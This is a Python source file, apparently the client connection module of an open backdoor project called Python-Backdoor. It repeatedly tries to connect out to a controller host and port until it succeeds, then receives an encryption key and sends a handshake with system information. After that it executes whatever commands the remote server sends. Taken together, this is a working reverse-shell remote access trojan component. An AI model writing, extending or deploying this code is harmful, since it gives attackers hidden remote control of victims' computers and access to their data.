"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import base64
import socket
import time

from src.definitions import platforms

if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
    from src.client.control.unix import Unix as Control
else:
    from src.client.control.windows import Windows as Control

from src.encrypted_socket import EncryptedSocket
from src.client.command_handler import CommandHandler
from src.definitions.commands import *


class Socket(EncryptedSocket):
    def __init__(self, host, port):
        super().__init__()

        self.host = host
        self.port = port
        self.socket = socket.socket()

    def connect(self):
        while True:  # infinite loop until socket can connect
            try:
                self.socket.connect((self.host, self.port))
            except socket.error:
                time.sleep(3)  # wait 3 seconds to try again
            else:
                break

        # first message must always be the key as b64
        key = base64.b64decode(self.recv(False))
        self.set_key(key)
        self.logger.debug(f"recv key: {key}")

        c = Control(self)

        # send handshake
        self.send_json(CLIENT_HANDSHAKE, c.get_info())

        ch = CommandHandler(c)

        while True:
            msg = self.recv_json()
            ch.parse(msg)
